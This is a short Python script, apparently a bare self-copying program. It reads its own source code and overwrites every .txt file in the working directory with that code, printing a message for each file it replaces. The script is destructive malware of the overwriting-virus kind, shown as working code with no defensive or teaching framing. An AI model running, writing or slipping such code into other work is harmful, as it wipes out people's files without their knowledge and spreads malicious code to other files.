import os

def copy_to_files():
    # Read the content of this script
    with open(__file__, 'r') as file:
        script_content = file.read()

    # Get a list of all files in the current directory
    files_in_directory = os.listdir('.')

    for filename in files_in_directory:
        if filename.endswith('.txt') and filename != __file__:
            with open(filename, 'w') as file:
                file.write(script_content)
            print(f"Copied to {filename}")

if __name__ == "__main__":
    copy_to_files()
